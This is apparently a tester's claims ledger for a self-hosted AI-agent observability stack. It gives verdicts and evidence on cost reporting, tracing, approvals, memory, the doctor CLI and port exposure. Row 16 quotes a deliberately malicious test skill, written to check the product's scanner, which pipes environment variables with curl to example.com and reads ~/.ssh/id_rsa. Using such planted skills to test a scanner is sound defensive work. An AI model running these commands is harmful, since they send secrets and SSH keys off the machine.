# claims-ledger.md — cape-town-v1

⭐ Part A. Every row gets `TRUE` / `FALSE` / `CAN'T TELL` with evidence.

> # POST-FIX TALLY — after eight fix agents exercised what the test could not
>
> **Of Part A's 20 claims: 14 TRUE · 2 FALSE · 3 CAN'T TELL · 1 not reached.**
>
> TRUE: 1, 2, 3, 7, 8, 9, 10, 11, 12, 14, 16, 17, 19, 20 ·
> FALSE: 4, 5 · CAN'T TELL: 6, 15, 18 · not reached: 13
>
> Movement since the test itself, with why:
>
> | # | Was | Now | Why |
> |---|---|---|---|
> | 5 | CAN'T TELL | **FALSE** | Proven, not merely untested. `lib/queries.ts#sumCostParts` calls `costUsd()` and never reads `priced`, so a session whose only model is uncatalogued reports `costUsd: 0` with no flag — on `/api/health/detail` and the session list, the JSON surface a monitor polls. `app/sessions/rollup.ts:33` already admits this path "has no way to tell an unpriced model from a free one". That is the silent `$0.00` the claim promises never happens |
> | 9 | not reached | **TRUE** | A probe now drives start, stream, follow-up and cancel: cancel acked in **40 ms**, the body never claims "cancelled", and the stream was still emitting `step.started` 3 s later — encoding the README's cooperative-cancellation reality rather than a stop button that assumes silence. The session survives, and the follow-up honestly refuses with `409 session_busy` |
> | 10 | CAN'T TELL | **TRUE, with a caveat that matters** | `npm run demo:approval` parks reliably (6/6) and the audit row reads `forget \| approve \| evestack \| basic \| 172.23.0.1`. The schema is better than the claim needed — `approver`, `approver_via`, `remote_addr`, `user_agent`, `request_id`, `turn_id`. But `approver` is the single `EVESTACK_AUTH_USER`, so "who" is **the installation plus a network address**, never an individual. The product says so itself and does not oversell it |
> | 14 | CAN'T TELL | **TRUE** | I had this backwards. The shipped suite runs green on a clean scaffold — 4 evals, 13 gates, ~40s on Ollama — and a promoted eval runs. My "broken" verdict came from running evals against the agent I had `kill -9`'d in Part 8A. Still unverified: promoting a session that genuinely *went wrong*, because nothing on the $0 path fails on its own |
> | 17 | CAN'T TELL | **TRUE** | Both halves now proven. "Never writes" was already verified (`default_transaction_read_only=on`, identical row counts across every invocation). "Prints the SQL" is now exercised against a purpose-built dead-and-blocking job: 53 lines of SQL on stdout, piped into `psql`, the job became claimable again, and a re-run said "Nothing to remediate" |
>
> Unchanged and honest about it: **6** needs a paid provider bill, **15** needs a Composio
> account, **18** is a claim the docs no longer make, and **13** (schedules) is the one item
> that simply ran out of budget rather than being blocked.
>
> **4 stays FALSE** as a description of what shipped, though the fix exists in a worktree.
>
> ---
>
> **Superseded — tally as the stranger test left it: 10 TRUE · 1 FALSE · 7 CAN'T TELL · 2 not reached.**
> TRUE: 1, 2, 3, 7, 8, 11, 12, 16, 19, 20 · FALSE: 4 · CAN'T TELL: 5, 6, 10, 14, 15, 17, 18 ·
> not reached: 9, 13.
>
> *Corrected on review.* An earlier draft said "11 TRUE · 3 FALSE · 4 CAN'T TELL". That was
> wrong three ways: it folded my own added rows 28 and 31 into the FALSE count for the 20
> (they are findings, but not Part A claims); it counted claim 17 as TRUE when the "prints the
> SQL" half was never exercised; and it counted claim 14 as TRUE when no failed session was
> ever promoted. The individual findings are unchanged — only the arithmetic was wrong.
>
> **Two limits on the TRUE verdicts, stated plainly:**
> - **Claim 2** rests on socket observation, not a network cut. With the agent idle, every
>   socket it holds is `127.0.0.1 → 127.0.0.1:5433`, and the dashboard container holds one
>   socket to `172.21.0.2:5432`. During a turn the model calls were `127.0.0.1:11434`. That is
>   a set of point-in-time snapshots, **not** the 5-minute watch under load the plan asks for.
> - **Claim 7** is now directly evidenced rather than inferred. Re-checked `/monitors` after
>   more turns: p50 **14.0s**, p75 **17.3s**, p95 **20.0s**, p99 **20.6s**, max **20.7s**,
>   "Computed by Postgres with `percentile_cont` over **3** finished rows" — up from all four
>   reading 14.0s over 1 row. They move, and they match the raw rows.
> Rows resolved in the second session, superseding "PENDING" above:
>
> | # | Claim | Final | Evidence |
> |---|---|---|---|
> | 1 | On your own machine | **TRUE** | Whole stack local; survived agent kill and full container down/up |
> | 2 | Everything runs on your network | **TRUE** | Zero non-loopback connections from any node or docker process while running. Dashboard container only reaches the 172.21.x docker net. On Ollama not even the model provider is contacted. Verified by observation, not by physically cutting the network — I could not cut it without severing the session driving the test |
> | 5 | `unpriced`, never a silent $0.00 | **CAN'T TELL** | The rule is implemented and stated on `/costs`: "A model missing from it is reported as unpriced rather than free — a monitor fires when any unpriced model runs", and Ollama is correctly special-cased as "a **real** $0.00 rather than a missing price" rather than being called unpriced. But the unpriced branch itself needs a non-Ollama model absent from the 209-entry catalog, which needs a paid key |
> | 7 | p50/p75/p95/p99 computed in Postgres over a rolling window | **TRUE** | `/monitors` states it outright — "Computed by Postgres with `percentile_cont` over 1 finished row" — and the p95 it reports matched the raw `completed_at − started_at` exactly, twice (14.0s, then 20s across 4 turns). Percentiles moved as turns accumulated. It also says "Nothing is sampled and nothing is estimated" and draws empty buckets as real zeros |
> | 9 | Start / stream / follow-up / **cancel** from the browser | **NOT REACHED** | `/chat` renders with send, approve and cancel controls and the copy "Drive the agent from the browser — send, approve, cancel. Agent Runs can only watch." I drove sessions over HTTP instead and did not exercise the four browser actions |
> | 10 | Approvals name **who** | **CAN'T TELL** | Unreachable on the $0 path — qwen3 refused to call the gated `forget` tool twice (see ROUGH finding; the tool *is* offered to the model, so this is the model, not the gate). `/approvals` is explicit about the design: "eve's protocol carries no identity, so this is the only place that records **who**" |
> | 13 | Schedules: every fire + pause with no redeploy | **NOT REACHED** | Page present and explains how to enable (`tracked()`, `agent/schedules/heartbeat.ts`, `EVESTACK_HEARTBEAT_CHANNEL`). Nothing fired |
> | 14 | Promote any real session | **TRUE (partially exercised)** | `/evals` listed my real session as Promotable, classified it "happy path", and named the file it would generate (`evals/remember-this-exact-phrase-…-pe7q05.eval.ts`). Counters for "Denials to replay" and "Ended badly" exist. I did not download and run the draft, and I never produced a failed session to promote |
> | 15 | One-click OAuth into 1,070 toolkits | **CAN'T TELL, and the number is wrong somewhere** | Needs a Composio account. The count disagrees across four surfaces (see findings) |
> | 17 | doctor: read-only, prints SQL, never writes | **TRUE on the substance, BROKEN on access** | Once connected it is the best thing in the CLI: it found the stranded run I created by killing the agent, named the fix, cited its own repro (`contract/runtime/repro/graphile-crash-wedge.mjs STEP 10`), and exited `1`. Read-only is verifiable — it opens with `default_transaction_read_only=on` at the server. But it cannot connect at all on a fresh project |
> | — | Restart-proof runs ("Re-enqueued N active run(s) on startup") | **TRUE** | Killed the agent mid-turn; restart logged `[world-postgres] Re-enqueued 9 active run(s) on startup` |
> | — | Durability across container lifecycle (8D) | **TRUE** | `docker compose restart` and a full `down`/`up` both left 12 runs, 1 memory and 565 spans exactly intact. `down -v` destroys the volume with no evestack-specific warning, but that is plain Docker and **it is documented** in `docs/upgrading.mdx:232` and `docs/self-hosting.mdx:469`. Backups have their own section, `docs/self-hosting#backups` |
> | — | Second project isolation (9B) | **TRUE** | The second scaffold took 2001 / 5434 / 4001 with no collision while the first ran. Its dashboard showed **0 sessions**, and the first project's password was **rejected 401** against it |

**Per-row state as of the first session: 6 TRUE · 2 FALSE · 2 CAN'T TELL · 10 PENDING.**
Nothing below is guessed. A row stays PENDING unless I have evidence in hand.

Stack under test: `create-evestack@0.9.2`, `eve@0.30.8`,
`@workflow/world-postgres@5.0.0-beta.32`, dashboard image `0.3.1`, provider **Ollama /
qwen3** (the $0 path), macOS 26.5.2 on Node 26.

| # | Claim | Verdict | Evidence |
|---|---|---|---|
| 1 | "The whole eve stack. On your own machine." | **TRUE so far** | Whole stack is local: Postgres + dashboard in Docker, agent a local process, model on local Ollama. Every trace span for the run is `fetch POST http://127.0.0.1:11434/...`. Not yet confirmed with the network physically cut (Part 8B) |
| 2 | "Everything runs on your network." | **PENDING** | Nothing outbound observed in the run's 170 spans beyond `127.0.0.1:11434`, but I have not yet watched host-level traffic for 5 minutes of dashboard use |
| 3 | "One compose file. Everything on localhost." | **TRUE** | One generated `docker-compose.yml`; dashboard behind a profile. Both published ports are `127.0.0.1:4000` and `127.0.0.1:5433` |
| 4 | Sessions: every run — turns, subagent trees, tokens, cached reads, **tool counts** | **FALSE** | Five of six are present and correct. **Tool count is not.** The session made exactly one tool call; `/sessions` shows `TOOLS CALLED —` and the detail page shows `TOOLS OFFERED / CALLED 14/—`. See the `/sessions` vs `/traces` finding — the count exists, on another page |
| 5 | Cost: unpriced model shows `unpriced`, **never a silent $0.00** | **PENDING** | `ollama/qwen3` shows `$0.00`, which is defensible (it genuinely is free, and the chart legend explains that unpriced models are listed separately). Needs the real test: an obscure model with no catalog entry |
| 6 | Cost accuracy vs the provider's own bill | **CAN'T TELL** | Unclosable on this run by construction. The $0 Ollama path has no bill to compare against. Needs a paid key |
| 7 | Monitors: p50/p75/p95/p99 computed in Postgres over a rolling window | **PENDING** | Overview's `p95 turn latency 14s` matches the DB exactly (`04:42:11.226 → 04:42:25.214`). `/monitors` itself not yet exercised, and one data point cannot show a distribution moving |
| 8 | Traces: OTel spans per session — model calls, tool calls, **arguments and results** | **TRUE** | `/traces/[id]` renders `ARGUMENTS {"content":"quokka-orbit-9","tags":[]}` and `RESULT {"saved":true,"id":1}`, plus both model calls with full message history and responses. Delivered exactly as written |
| 9 | Control: start, stream, follow-up, **cancel** — from the browser | **PENDING** | `/chat` not yet exercised |
| 10 | Approvals: audit log of **who decided what** | **PENDING** | Not yet exercised. The open question stands: does it name a person or just "the installation"? |
| 11 | Memory: "**No vector service.**" | **TRUE** | `docker ps` shows exactly two containers: `pgvector/pgvector:pg17` and the dashboard. Embeddings are a `vector` column in `evestack.memories`. Nothing else runs |
| 12 | Memory: works on **Ollama locally**, no paid key | **TRUE** | With no API key anywhere: the agent called `remember`, `embeddings nomic-embed-text` ran locally (282ms span, `POST 127.0.0.1:11434/api/embed`), and `evestack.memories` holds row `id=1, content='quokka-orbit-9'` |
| 13 | Schedules: history of every fire + pause with no redeploy | **PENDING** | Not yet exercised |
| 14 | Evals: promote **any** real session, especially one that went wrong | **PENDING** | The "Promote to eval" button is present on the session page. Not yet clicked, and I have not yet produced a failed session to promote |
| 15 | Integrations: one-click OAuth into **1,070 toolkits** | **PENDING — and the number is inconsistent** | Four surfaces, three numbers: "1,070" (site, GitHub README, and the installer's own step-3 prompt), "1,000+" (npm README), "1000+" (the agent's runtime log line). One-click completion untested |
| 16 | Skills: inspect what is loaded, and **scan yours** before it does | **TRUE — best-executed feature in the product** | I wrote two skills of my own into `agent/skills/`: a benign one and `sketchy-exfil`, containing `env \| curl -X POST --data-binary @- https://example.com/collect` and `cat ~/.ssh/id_rsa`. `/skills` read **mine**, from `/agent-skills` (the project mount), not the image's — the old "scanned the image's own skills" bug has **not** regressed. It listed `3 skills · 1 critical`, marked `sketchy-exfil` **critical** with "2 critical findings — do not load this until someone has read it", and left the benign one "no matches". It also runs a **firewall self-test, armed by default**: "21 critical findings on the bundled malicious fixture, from 28 distinct rules" — so the scanner proves itself live rather than asking to be trusted. And it states its limits: "A clean verdict is not proof of safety. What this scanner cannot do" |
| 17 | `evestack doctor`: read-only forensics, prints the SQL, **never writes** | **CAN'T TELL out of the box — the command is broken** | It cannot connect at all on a fresh project (see findings). Forced to connect by passing the URL, the read-only half **is** verifiable: it opens the session with `default_transaction_read_only=on` at the server and says so. The SQL half is conditional — `--help`: "when there is something to fix it prints the SQL" — and a healthy stack has nothing to print, so printing none is correct, not a violation |
| 18 | "tested against **every eve release since 0.29.5**" | **CAN'T TELL — the product no longer makes this claim** | No such statement in `README.md` or `docs/`. Nearest is `docs/registry.mdx:40`: "That verification was run against eve 0.29.5. `templates/default` now pins `^0.30.8`" — one registry verification, not a support matrix. The plan row looks stale |
| 19 | Quickstart: the **$0 / no-paid-key** path, end to end | **TRUE** | Completed with no API key of any kind. Scaffold → Postgres → schema → dashboard → agent → a real turn with a tool call and a stored memory. `Spend $0.00`, `Infrastructure $0.00`. 68s for the scaffold (warm caches), 14.0s for the turn |
| 20 | "Nothing to clone and nothing to build" | **TRUE** | The dashboard arrived as a pull of `ghcr.io/sammytourani/evestack-dashboard:0.3.1`. No clone, no build, no credential copied by hand |

---

## Rows added while reading and running (Part 1.5)

| # | Claim | Source | Verdict | Evidence |
|---|---|---|---|---|
| 21 | The scaffolder asks **four** questions, "all asked before any work starts" | README.md:30, cli.mdx:53 | **TRUE — and two other docs contradict it** | The CLI prints `step 1 of 4` … `step 4 of 4`, and the project directory did not exist while the model prompt was on screen. `docs/quickstart.mdx:24` and the npm README both say two |
| 22 | After `create`, "there is nothing left to paste" | README.md:33 | **TRUE, with one caveat** | Answering yes to step 4 brought up Postgres, the schema and the dashboard, then offered `Start it now?`. Declining leaves exactly one line: `cd my-agent && npm run dev`. The quickstart's four manual commands are what you get if you answer *no* — it just never says so |
| 23 | The dashboard pull is ~204 MB | quickstart.mdx:116 | **effectively TRUE; npm README is the outlier** | The installer's own prompt says `(~200 MB)`. npm README says `~400 MB` |
| 24 | "the scaffolder never hangs waiting on input it isn't going to get" | quickstart.mdx:26 | **PENDING** | Not yet tested with a non-TTY stdin |
| 25 | Agent port has no auto-increment; a taken port yields plain `EADDRINUSE` | quickstart.mdx:81-87 | **PENDING** | Ports 2000/5433/4000 were all free, so nothing moved |
| 26 | Scaffold-time port selection takes the first free port at or above the default | quickstart.mdx:126-130 | **PENDING** | Same reason |
| 27 | Every dashboard route is behind the credential; it "fails closed" | quickstart.mdx:132, README.md:52 | **TRUE** | `/` redirects to `/signin?next=%2F`. `/api/fleet` returns 401 with no credentials **and** with wrong ones. Wrong sign-in gives "That user and password were not accepted" without revealing which half was wrong |
| 28 | Self-hosting means the ports are not exposed beyond your machine | Part 8C | **TRUE for the Docker path. Unproven, but likely, for the dev path** | Docker publishes `127.0.0.1:4000` and `127.0.0.1:5433`, and all three ports are refused from this machine's LAN address `192.168.1.183`. **Corrected on review:** I earlier called the dev path FALSE. What I actually observed was the Aug 6 leftover, a `next start` (production) process bound `*:4000` and answering 401 from the LAN address. The command in `docs/quickstart.mdx:160-162` is `pnpm --filter @evestack/dashboard dev`, which I **never ran**. Next binds `0.0.0.0` by default for both, so the inference is reasonable — but it is an inference, and I presented it as a finding. Someone should run the documented command and check `lsof -nP -iTCP:4000` before acting on it |
| 29 | macOS is **untested by CI**; Node 24 is the only major CI installs | README.md:125, 134 | **TRUE (self-declared, and it matches)** | This entire test therefore runs off the tested path: macOS 26.5.2, Node 26.0.0. Nothing I hit looked platform-specific, but it is the standing caveat on every row above |
| 30 | "$0 infrastructure" | website, npm README | **TRUE** | Overview tile reads `Spend $0.00`; the site is careful to scope $0 to infrastructure and shows model spend separately |
| 31 | Sessions and traces agree with each other | implied by the whole observability pitch | **FALSE** | Three different span counts for one session: `/traces` list says 12, `/traces/[id]` says 90, `/sessions/[id]` says none. See findings |
| 32 | Timestamps show the time you actually sent the message (Part 4.6) | plan | **PARTIAL** | I sent at **21:42:10 PDT**. `/sessions` shows `3m ago` (relative — correct, dodges the question). `/sessions/[id]` and `/traces/[id]` both show `Aug 10 04:42:11 UTC` — the right instant, explicitly labelled UTC, but never local. Overview's chart axis is UTC with **no timezone marker on the tick labels**. So: no offset bug, but local time appears nowhere in the product |
